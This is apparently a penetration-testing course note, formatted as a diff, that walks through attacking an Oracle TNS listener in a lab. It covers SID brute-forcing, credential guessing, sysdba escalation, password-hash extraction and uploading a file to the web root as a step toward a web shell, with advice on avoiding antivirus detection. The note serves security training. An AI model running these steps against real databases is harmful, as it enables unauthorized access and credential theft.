+The SIDs are an essential part of the connection process, as it identifies the specific instance of the database the client wants to connect to. If the client specifies an incorrect SID, the connection attempt will fail. Database administrators can use the SID to monitor and manage the individual instances of a database. For example, they can start, stop, or restart an instance, adjust its memory allocation or other configuration parameters, and monitor its performance using tools like Oracle Enterprise Manager.
+
+There are various ways to enumerate, or better said, guess SIDs. Therefore we can use tools like `nmap`, `hydra`, `odat`, and others. Let us use `nmap` first.
+
+#### Nmap - SID Bruteforcing
+
+```shell
+gitblanc@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST
+Nmap scan report for 10.129.204.235
+Host is up (0.0044s latency).
+
+PORT     STATE SERVICE    VERSION
+1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
+| oracle-sid-brute: 
+|_  XE
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 55.40 seconds
+```
+
+We can use the `odat.py` tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components. Those scans can retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfigurations, etc. Let us use the `all` option and try all modules of the `odat.py` tool.
+
+#### ODAT
+
+```shell
+gitblanc@htb[/htb]$ ./odat.py all -s 10.129.204.235
+
+[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
+[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...
+
+...SNIP...
+
+[!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16 
+[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05 
+[!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59
+[+] Valid credentials found: scott/tiger. Continue...
+
+...SNIP...
+```
+
+In this example, we found valid credentials for the user `scott` and his password `tiger`. After that, we can use the tool `sqlplus` to connect to the Oracle database and interact with it.
+
+#### SQLplus - Log In
+
+```shell
+gitblanc@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE
+
+SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
+Version 21.4.0.0.0
+
+Copyright (c) 1982, 2021, Oracle. All rights reserved.
+
+ERROR:
+ORA-28002: the password will expire within 7 days
+
+
+
+Connected to:
+Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+
+SQL> 
+```
+
+If you come across the following error `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, please execute the below, taken from [here](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared).
+
+```shell
+gitblanc@htb[/htb]$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
+```
+
+There are many [SQLplus commands](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985) that we can use to enumerate the database manually. For example, we can list all available tables in the current database or show us the privileges of the current user like the following:
+
+#### Oracle RDBMS - Interaction
+
+```shell
+SQL> select table_name from all_tables;
+
+TABLE_NAME
+------------------------------
+DUAL
+SYSTEM_PRIVILEGE_MAP
+TABLE_PRIVILEGE_MAP
+STMT_AUDIT_OPTION_MAP
+AUDIT_ACTIONS
+WRR$_REPLAY_CALL_FILTER
+HS_BULKLOAD_VIEW_OBJ
+HS$_PARALLEL_METADATA
+HS_PARTITION_COL_NAME
+HS_PARTITION_COL_TYPE
+HELP
+
+...SNIP...
+
+
+SQL> select * from user_role_privs;
+
+USERNAME                       GRANTED_ROLE                   ADM DEF OS_
+------------------------------ ------------------------------ --- --- ---
+SCOTT                          CONNECT                        NO  YES NO
+SCOTT                          RESOURCE                       NO  YES NO
+```
+
+Here, the user `scott` has no administrative privileges. However, we can try using this account to log in as the System Database Admin (`sysdba`), giving us higher privileges. This is possible when the user `scott` has the appropriate privileges typically granted by the database administrator or used by the administrator him/herself.
+
+#### Oracle RDBMS - Database Enumeration
+
+```shell
+gitblanc@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba
+
+SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
+Version 21.4.0.0.0
+
+Copyright (c) 1982, 2021, Oracle. All rights reserved.
+
+
+Connected to:
+Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+
+
+SQL> select * from user_role_privs;
+
+USERNAME                       GRANTED_ROLE                   ADM DEF OS_
+------------------------------ ------------------------------ --- --- ---
+SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
+SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
+SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
+SYS                            AQ_USER_ROLE                   YES YES NO
+SYS                            AUTHENTICATEDUSER              YES YES NO
+SYS                            CONNECT                        YES YES NO
+SYS                            CTXAPP                         YES YES NO
+SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
+SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
+SYS                            DBA                            YES YES NO
+SYS                            DBFS_ROLE                      YES YES NO
+
+USERNAME                       GRANTED_ROLE                   ADM DEF OS_
+------------------------------ ------------------------------ --- --- ---
+SYS                            DELETE_CATALOG_ROLE            YES YES NO
+SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
+...SNIP...
+```
+
+We can follow many approaches once we get access to an Oracle database. It highly depends on the information we have and the entire setup. However, we can not add new users or make any modifications. From this point, we could retrieve the password hashes from the `sys.user$` and try to crack them offline. The query for this would look like the following:
+
+#### Oracle RDBMS - Extract Password Hashes
+
+```shell
+SQL> select name, password from sys.user$;
+
+NAME                           PASSWORD
+------------------------------ ------------------------------
+SYS                            FBA343E7D6C8BC9D
+PUBLIC
+CONNECT
+RESOURCE
+DBA
+SYSTEM                         B5073FE1DE351687
+SELECT_CATALOG_ROLE
+EXECUTE_CATALOG_ROLE
+DELETE_CATALOG_ROLE
+OUTLN                          4A3BA55E08595C81
+EXP_FULL_DATABASE
+
+NAME                           PASSWORD
+------------------------------ ------------------------------
+IMP_FULL_DATABASE
+LOGSTDBY_ADMINISTRATOR
+...SNIP...
+```
+
+Another option is to upload a web shell to the target. However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver. Nevertheless, if we know what type of system we are dealing with, we can try the default paths, which are:
+
+|**OS**|**Path**|
+|---|---|
+|Linux|`/var/www/html`|
+|Windows|`C:\inetpub\wwwroot`|
+
+First, trying our exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention systems is always important. Therefore, we create a text file with a string and use it to upload to the target system.
+
+#### Oracle RDBMS - File Upload
+
+```shell
+gitblanc@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
+gitblanc@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
+
+[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
+[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
+```
+
+Finally, we can test if the file upload approach worked with `curl`. Therefore, we will use a `GET http://<IP>` request, or we can visit via browser.
+
+```shell
+gitblanc@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt
+
+Oracle File Upload Test
+```
+
